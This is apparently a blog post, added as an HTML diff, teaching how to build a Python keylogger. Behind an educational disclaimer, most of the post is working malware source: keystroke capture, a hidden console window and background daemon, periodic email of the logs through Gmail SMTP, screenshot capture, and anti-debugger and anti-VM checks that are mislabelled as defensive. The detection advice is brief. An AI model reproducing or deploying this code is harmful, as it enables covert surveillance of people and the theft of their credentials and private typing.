@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Building a Keylogger in Python - DZ Blog</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="../css/post.css">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <h1 class="logo"><a href="../index.html"><span class="logo-draco">Draco</span><span class="logo-zona">Zona</span><span class="cursor">_</span></a></h1>
+            <nav class="nav">
+                <a href="../index.html">Blog</a>
+                <a href="../about.html">About</a>
+                <a href="../cv.html">CV</a>
+                <a href="../certifications.html">Certifications</a>
+                <a href="../contact.html">Contact</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="main">
+        <div class="container">
+            <article class="post">
+                <div class="back-to-blog">
+                    <a href="../index.html" class="back-btn">← Back to Blog</a>
+                </div>
+                
+                <header class="post-header">
+                    <div class="post-meta">
+                        <span class="post-date">January 12, 2024</span>
+                        <span class="post-category">Malware Analysis</span>
+                    </div>
+                    <h1 class="post-title">Building a Keylogger in Python</h1>
+                    <div class="post-tags">
+                        <span class="tag">python</span><span class="tag">tools</span><span class="tag">malware</span>
+                    </div>
+                </header>
+
+                <div class="post-content">
+                    <p><h1>Building a Keylogger in Python</h1></p><p><strong>Disclaimer</strong>: This tutorial is for educational purposes only. Understanding how keyloggers work helps security professionals better defend against them. Only use this knowledge in authorized environments.</p><p><h2>What is a Keylogger?</h2></p><p>A keylogger is software that records keystrokes made by a user. While often associated with malicious activities, keyloggers have legitimate uses in:</p><p>- Parental monitoring<br>- Employee productivity tracking<br>- Personal backup of typed content<br>- Security research and testing</p><p><h2>Basic Keylogger Implementation</h2></p><p><h3>Required Libraries</h3><br><code></code>`python<br>import pynput<br>import logging<br>import os<br>import smtplib<br>from email.mime.text import MIMEText<br>from datetime import datetime<br><code></code>`</p><p><h3>Simple Keylogger</h3><br><code></code>`python<br>from pynput import keyboard<br>import logging</p><p><h1>Configure logging</h1><br>logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(message)s')</p><p>def on_press(key):<br>    try:<br>        # Log alphanumeric keys<br>        logging.info(f'{key.char}')<br>    except AttributeError:<br>        # Log special keys<br>        if key == keyboard.Key.space:<br>            logging.info(' ')<br>        elif key == keyboard.Key.enter:<br>            logging.info('\n')<br>        elif key == keyboard.Key.backspace:<br>            logging.info('[BACKSPACE]')<br>        else:<br>            logging.info(f'[{key}]')</p><p>def on_release(key):<br>    # Stop listener on ESC<br>    if key == keyboard.Key.esc:<br>        return False</p><p><h1>Start listening</h1><br>with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:<br>    listener.join()<br><code></code>`</p><p><h2>Advanced Features</h2></p><p><h3>Stealth Mode</h3><br><code></code>`python<br>import os<br>import sys<br>import ctypes</p><p>def hide_console():<br>    """Hide console window on Windows"""<br>    if os.name == 'nt':<br>        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)</p><p>def run_as_service():<br>    """Run keylogger as background service"""<br>    if os.name == 'posix':<br>        # Unix/Linux daemon<br>        pid = os.fork()<br>        if pid > 0:<br>            sys.exit(0)<br>    <br>    hide_console()<br><code></code>`</p><p><h3>Email Reporting</h3><br><code></code>`python<br>import smtplib<br>from email.mime.text import MIMEText<br>from email.mime.multipart import MIMEMultipart</p><p>class EmailReporter:<br>    def __init__(self, email, password, smtp_server="smtp.gmail.com", port=587):<br>        self.email = email<br>        self.password = password<br>        self.smtp_server = smtp_server<br>        self.port = port<br>    <br>    def send_log(self, log_content):<br>        try:<br>            msg = MIMEMultipart()<br>            msg['From'] = self.email<br>            msg['To'] = self.email<br>            msg['Subject'] = f"Keylog Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"<br>            <br>            msg.attach(MIMEText(log_content, 'plain'))<br>            <br>            server = smtplib.SMTP(self.smtp_server, self.port)<br>            server.starttls()<br>            server.login(self.email, self.password)<br>            server.send_message(msg)<br>            server.quit()<br>            <br>        except Exception as e:<br>            logging.error(f"Email send failed: {e}")<br><code></code>`</p><p><h3>Screenshot Capture</h3><br><code></code>`python<br>import pyautogui<br>from PIL import Image<br>import io<br>import base64</p><p>class ScreenCapture:<br>    def __init__(self):<br>        self.screenshot_interval = 300  # 5 minutes<br>    <br>    def capture_screen(self):<br>        try:<br>            screenshot = pyautogui.screenshot()<br>            <br>            # Compress image<br>            buffer = io.BytesIO()<br>            screenshot.save(buffer, format='JPEG', quality=50)<br>            <br>            # Encode to base64<br>            img_data = base64.b64encode(buffer.getvalue()).decode()<br>            <br>            return img_data<br>        except Exception as e:<br>            logging.error(f"Screenshot failed: {e}")<br>            return None<br><code></code>`</p><p><h3>Advanced Keylogger Class</h3><br><code></code>`python<br>import threading<br>import time<br>from datetime import datetime, timedelta</p><p>class AdvancedKeylogger:<br>    def __init__(self, log_file="keylog.txt", email_interval=3600):<br>        self.log_file = log_file<br>        self.email_interval = email_interval<br>        self.last_email = datetime.now()<br>        self.buffer = []<br>        self.running = False<br>        <br>        # Initialize components<br>        self.email_reporter = EmailReporter("your_email@gmail.com", "your_password")<br>        self.screen_capture = ScreenCapture()<br>    <br>    def on_press(self, key):<br>        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")<br>        <br>        try:<br>            key_data = f"[{timestamp}] {key.char}"<br>        except AttributeError:<br>            if key == keyboard.Key.space:<br>                key_data = f"[{timestamp}] [SPACE]"<br>            elif key == keyboard.Key.enter:<br>                key_data = f"[{timestamp}] [ENTER]"<br>            else:<br>                key_data = f"[{timestamp}] [{key}]"<br>        <br>        # Add to buffer<br>        self.buffer.append(key_data)<br>        <br>        # Write to file<br>        with open(self.log_file, "a") as f:<br>            f.write(key_data + "\n")<br>        <br>        # Check if email should be sent<br>        if datetime.now() - self.last_email > timedelta(seconds=self.email_interval):<br>            self.send_email_report()<br>    <br>    def send_email_report(self):<br>        if self.buffer:<br>            log_content = "\n".join(self.buffer)<br>            <br>            # Add screenshot<br>            screenshot = self.screen_capture.capture_screen()<br>            if screenshot:<br>                log_content += f"\n\nScreenshot: {screenshot[:100]}..."<br>            <br>            self.email_reporter.send_log(log_content)<br>            self.buffer.clear()<br>            self.last_email = datetime.now()<br>    <br>    def start(self):<br>        self.running = True<br>        hide_console()<br>        <br>        with keyboard.Listener(on_press=self.on_press) as listener:<br>            listener.join()<br><code></code>`</p><p><h2>Detection and Prevention</h2></p><p><h3>How to Detect Keyloggers</h3><br><code></code>`python<br>import psutil<br>import os</p><p>def detect_suspicious_processes():<br>    """Detect potential keylogger processes"""<br>    suspicious_names = ['keylog', 'logger', 'capture', 'monitor']<br>    <br>    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):<br>        try:<br>            proc_name = proc.info['name'].lower()<br>            for suspicious in suspicious_names:<br>                if suspicious in proc_name:<br>                    print(f"Suspicious process: {proc.info}")<br>        except (psutil.NoSuchProcess, psutil.AccessDenied):<br>            pass</p><p>def check_network_connections():<br>    """Monitor unusual network activity"""<br>    connections = psutil.net_connections()<br>    for conn in connections:<br>        if conn.status == 'ESTABLISHED':<br>            print(f"Active connection: {conn}")<br><code></code>`</p><p><h3>Prevention Techniques</h3><br>- Use virtual keyboards for sensitive input<br>- Enable two-factor authentication<br>- Regular system scans with antivirus<br>- Monitor running processes<br>- Use encrypted communication channels</p><p><h2>Legal and Ethical Considerations</h2></p><p><h3>Legal Uses</h3><br>- Personal device monitoring (with consent)<br>- Corporate security (with employee notification)<br>- Parental controls<br>- Security research in controlled environments</p><p><h3>Illegal Uses</h3><br>- Unauthorized monitoring of others<br>- Stealing credentials or personal information<br>- Corporate espionage<br>- Identity theft</p><p><h2>Defensive Programming</h2></p><p><h3>Anti-Analysis Techniques</h3><br><code></code>`python<br>import sys<br>import os</p><p>def check_debugger():<br>    """Basic debugger detection"""<br>    if sys.gettrace() is not None:<br>        sys.exit("Debugger detected")</p><p>def check_vm():<br>    """Basic VM detection"""<br>    vm_indicators = [<br>        "VMware", "VirtualBox", "QEMU", "Xen"<br>    ]<br>    <br>    try:<br>        with open("/proc/version", "r") as f:<br>            version = f.read()<br>            for indicator in vm_indicators:<br>                if indicator.lower() in version.lower():<br>                    sys.exit("VM detected")<br>    except:<br>        pass<br><code></code>`</p><p><h2>Conclusion</h2></p><p>Understanding keylogger implementation helps security professionals:</p><p>- Recognize keylogger behavior patterns<br>- Develop better detection mechanisms<br>- Educate users about threats<br>- Implement appropriate countermeasures</p><p>Remember: Knowledge is power, but with power comes responsibility. Always use these techniques ethically and legally.</p><p><h2>Resources</h2></p><p>- [pynput documentation](https://pynput.readthedocs.io/)<br>- [Python security best practices](https://python.org/dev/security/)<br>- [OWASP security guidelines](https://owasp.org/)</p><p><em>Stay curious, stay ethical, and keep learning!</em></p>
+                </div>
+
+                <footer class="post-footer">
+                    <div class="post-navigation">
+                        <a href="../index.html" class="nav-link">← Back to Blog</a>
+                    </div>
+                </footer>
+            </article>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>Tender Juicy Hatdog <span class="heart">🌭</span> Hacking is not a crime.</p>
+        </div>
+    </footer>
+
+    <canvas id="matrixCanvas"></canvas>
+    <script src="../js/matrix.js"></script>
+</body>
+</html>
